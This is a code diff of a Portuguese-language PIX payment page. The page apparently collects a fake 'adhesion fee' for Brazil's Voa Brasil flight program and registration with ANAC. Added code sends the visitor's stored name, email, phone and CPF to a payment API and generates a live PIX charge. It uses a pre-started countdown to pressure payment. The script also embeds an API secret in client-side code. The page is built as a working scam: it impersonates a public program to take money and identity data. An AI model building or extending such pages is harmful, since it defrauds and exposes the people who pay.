@@ -716,8 +716,7 @@
         </div>
         <div class="pix-container">
           <div class="pix-code-container" id="pix-code">
-            00020126870014br.gov.bcb.pix2565pix.primepag.com.br/qr/v3/at/2bc61dea-10fe-4949-a2bf-5614685efa165204000053039865802BR5925LLKM
-            INTERMEDIACAO E TECN6009SAO PAULO62070503***63041662
+            Gerando código PIX...
           </div>
           <button class="copy-button" id="copy-button">
             <svg
@@ -744,7 +743,7 @@
         <div class="qr-container">
           <img
             id="qr-code"
-            src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=00020126870014br.gov.bcb.pix2565pix.primepag.com.br/qr/v3/at/2bc61dea-10fe-4949-a2bf-5614685efa165204000053039865802BR5925LLKM%20INTERMEDIACAO%20E%20TECN6009SAO%20PAULO62070503***63041662"
+            src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=Carregando..."
             alt="QR Code PIX"
             class="qr-code"
           />
@@ -904,58 +903,102 @@
     <script>
       document.addEventListener("DOMContentLoaded", function () {
         const minutesElement = document.getElementById("minutes");
+
         const secondsElement = document.getElementById("seconds");
+
         const progressFill = document.getElementById("progress-fill");
+
         const pixCode = document.getElementById("pix-code");
+
         const qrCode = document.getElementById("qr-code");
+
         const copyButton = document.getElementById("copy-button");
+
         const verifyButton = document.getElementById("verify-button");
+
         const loadingOverlay = document.getElementById("loading-overlay");
+
         const successOverlay = document.getElementById("success-overlay");
+
         const errorOverlay = document.getElementById("error-overlay");
+
         const errorMessage = document.getElementById("error-message");
+
         const successButton = document.getElementById("success-button");
+
         const errorButton = document.getElementById("error-button");
 
+        const userNameElement = document.getElementById("user-name");
+
         const API_BASE_URL = "https://api.innovapay.com.br";
+
         const API_SECRET =
           "sk_284a13c0ccfcaf63fa02186e5f7d63722bf265599b9d175f74e39e0678274e3abbdeb630af7839cf3cc70669c0bf565fc3c71017548ed01183809a51673d3e43";
 
         let userData = {};
+
         try {
           userData = JSON.parse(localStorage.getItem("dadosCPF")) || {};
-        } catch (error) {}
+
+          if (userData.NOME) {
+            const firstName = userData.NOME.split(" ")[0];
+
+            userNameElement.textContent = firstName;
+          }
+        } catch (error) {
+          alert("Houve um erro! Tente novamente mais tarde.");
+        }
 
         const paymentData = {
           external_id: "voa_brasil_" + Date.now(),
+
           webhook_url: "https://api.com",
+
           items: [
             {
               id: "taxa_adesao_voa_brasil",
+
               title: "Taxa de Adesão Voa Brasil",
+
               description: "Taxa de adesão para registro no sistema da ANAC",
+
               price: 87.4,
+
               quantity: 1,
+
               is_physical: false,
             },
           ],
+
           ip: "102.123.123.123",
+
           total_amount: 87.4,
+
           payment_method: "PIX",
+
           customer: {
             name: userData.NOME,
+
             email: userData.EMAIL,
+
             phone: userData.TELEFONE,
+
             document_type: "CPF",
+
             document: userData.CPF,
           },
         };
 
         let transactionId = null;
+
         let pixPayload = null;
 
         function startCountdown() {
           let totalSeconds = 10 * 60;
+
+          let initialSeconds = 9 * 60 + 51;
+
+          totalSeconds = initialSeconds;
 
           const countdownInterval = setInterval(() => {
             totalSeconds--;
@@ -965,36 +1008,48 @@
 
               errorMessage.textContent =
                 "O código PIX expirou. Por favor, gere um novo código.";
+
               errorOverlay.style.display = "flex";
             }
 
             const minutes = Math.floor(totalSeconds / 60);
+
             const seconds = totalSeconds % 60;
 
             minutesElement.textContent = String(minutes).padStart(2, "0");
+
             secondsElement.textContent = String(seconds).padStart(2, "0");
 
             const progressPercentage = (totalSeconds / (10 * 60)) * 100;
+
             progressFill.style.width = `${progressPercentage}%`;
           }, 1000);
         }
 
         copyButton.addEventListener("click", () => {
-          const codeToCopy = pixCode.textContent.trim();
+          if (!pixPayload) {
+            return;
+          }
 
           navigator.clipboard
-            .writeText(codeToCopy)
+
+            .writeText(pixPayload)
+
             .then(() => {
               const originalText = copyButton.innerHTML;
+
               copyButton.innerHTML =
                 '<span class="copy-icon">&#x2714;</span> CÓDIGO COPIADO!';
+
               copyButton.style.backgroundColor = "#168821";
 
               setTimeout(() => {
                 copyButton.innerHTML = originalText;
-                copyButton.style.backgroundColor = "#00AB4E";
+
+                copyButton.style.backgroundColor = "#00a65a";
               }, 2000);
             })
+
             .catch((err) => {
               alert(
                 "Não foi possível copiar o código. Por favor, selecione o código e copie manualmente."
@@ -1006,22 +1061,33 @@
           try {
             const response = await fetch(`${API_BASE_URL}/v1/transactions`, {
               method: "POST",
+
               headers: {
                 "Content-Type": "application/json",
+
                 "api-secret": API_SECRET,
               },
+
               body: JSON.stringify(paymentData),
             });
 
             if (!response.ok) {
               const errorData = await response.json();
+
               throw new Error(errorData.message || "Erro ao criar transação");
             }
 
             const data = await response.json();
 
             transactionId = data.id;
+
             pixPayload = data.pix.payload;
+
+            pixCode.textContent = pixPayload;
+
+            qrCode.src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(
+              pixPayload
+            )}`;
 
             return data;
           } catch (error) {
@@ -1037,8 +1103,10 @@
           try {
             const response = await fetch(
               `${API_BASE_URL}/v1/transactions/${transactionId}`,
+
               {
                 method: "GET",
+
                 headers: {
                   "api-secret": API_SECRET,
                 },
@@ -1047,6 +1115,7 @@
 
             if (!response.ok) {
               const errorData = await response.json();
+
               throw new Error(
                 errorData.message || "Erro ao verificar transação"
               );
@@ -1072,13 +1141,15 @@
               try {
                 const userData =
                   JSON.parse(localStorage.getItem("dadosCPF")) || {};
+
                 userData.PAGAMENTO_STATUS = "AUTORIZADO";
+
                 userData.PAGAMENTO_ID = transactionData.id;
+
                 userData.PAGAMENTO_VALOR = transactionData.total_value;
+
                 localStorage.setItem("dadosCPF", JSON.stringify(userData));
-              } catch (error) {
-                // Continua mesmo se houver erro no localStorage
-              }
+              } catch (error) {}
 
               successOverlay.style.display = "flex";
             } else if (transactionData.status === "PENDING") {
@@ -1087,6 +1158,7 @@
               );
             } else {
               errorMessage.textContent = `Pagamento não autorizado. Status: ${transactionData.status}`;
+
               errorOverlay.style.display = "flex";
             }
           } catch (error) {
@@ -1095,6 +1167,7 @@
             errorMessage.textContent =
               error.message ||
               "Erro ao verificar pagamento. Por favor, tente novamente.";
+
             errorOverlay.style.display = "flex";
           }
         });
@@ -1107,11 +1180,30 @@
           errorOverlay.style.display = "none";
         });
 
-        // Iniciar o contador
-        startCountdown();
+        async function initializePayment() {
+          try {
+            loadingOverlay.style.display = "flex";
 
-        // Esconder overlays no início
+            await createTransaction();
+
+            loadingOverlay.style.display = "none";
+
+            startCountdown();
+          } catch (error) {
+            loadingOverlay.style.display = "none";
+
+            errorMessage.textContent =
+              error.message ||
+              "Erro ao gerar código PIX. Por favor, tente novamente.";
+
+            errorOverlay.style.display = "flex";
+          }
+        }
+
+        initializePayment();
+
         successOverlay.style.display = "none";
+
         errorOverlay.style.display = "none";
       });
     </script>
